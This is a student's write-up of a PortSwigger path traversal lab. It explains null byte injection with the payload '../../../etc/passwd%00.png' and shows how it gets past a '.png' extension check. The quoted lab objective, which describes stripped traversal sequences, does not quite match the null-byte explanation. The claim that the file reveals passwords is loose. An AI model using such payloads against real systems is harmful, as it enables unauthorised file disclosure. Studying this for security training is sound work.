- **Lab objective** and difficulty level  
    
- **Step-by-step exploitation methodology**  
    
- **Payloads that worked** (and ones that didn't)  
    
- **Request/response samples** (screenshots or raw text)  
    
- **Why** the vulnerability existed and how to fix it

# **Lab objective** and difficulty level

```

This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 
```

# **Step-by-step exploitation methodology**

```
Intercept the request of the website and keep forwading till you see this
```

![Screenshot 2026-06-20 125329](../../../../Images/Screenshot%202026-06-20%20125329.png)

```
Now send req to repeater and change the parameter of image file in this format so even if website will filter it we can still see the the password
```

![Pasted image 20260620125824.png](Pasted%20image%2020260620125824.png)

# Explanation

This describes a **null byte injection** technique that affected some older applications and libraries.

### The Problem

Suppose the application only allows `.png` files:

```python
if filename.endswith(".png"):
    open(filename)
```

A normal request looks like:

```text
filename=cat.png
```

The developer assumes that anything ending in `.png` is safe.

---

### The Attack

The attacker supplies:

```text
filename=../../../etc/passwd%00.png
```

Here:

```text
%00
```

is the URL-encoded representation of a **null byte** (`\0`).

After decoding:

```text
../../../etc/passwd\0.png
```

---

### Why It Worked Historically

Some older languages and C-based libraries treated the null byte as the **end of the string**.

The application sees:

```text
../../../etc/passwd\0.png
```

and checks:

```text
endswith(".png")
```

which passes because the visible string ends with `.png`.

But when the filename is passed to a lower-level C function:

```text
../../../etc/passwd\0.png
```

the function stops reading at:

```text
\0
```

and effectively opens:

```text
../../../etc/passwd
```

instead of:

```text
../../../etc/passwd.png
```

---

### Visual Example

Application validation:

```text
../../../etc/passwd\0.png
                   ^^^^^
                sees .png
```

Operating system / C library:

```text
../../../etc/passwd\0.png
                   ^
             stops here
```

Result:

```text
/etc/passwd
```

gets opened.

---

### Why This Is Rare Today

Modern languages and frameworks usually:

- Reject null bytes in file paths.
    
- Properly handle string lengths.
    
- Prevent `\0` from truncating filenames.
    

For example, modern versions of:

- PHP
    
- Java
    
- Python
    
- .NET
    

generally block this behavior.

---

### Why PortSwigger Teaches It

PortSwigger includes this technique because:

1. It demonstrates how validation and file access can disagree.
    
2. You may encounter legacy applications or unusual libraries where it still matters.
    
3. It helps build intuition about how input is processed through multiple layers.
    

### Mental Model

Think of it like this:

```text
Application:
    "../../../etc/passwd\0.png"

File API:
    "../../../etc/passwd"
```

The application checks the whole string, but the underlying file-handling code stops at the null byte, causing the extension restriction to be bypassed.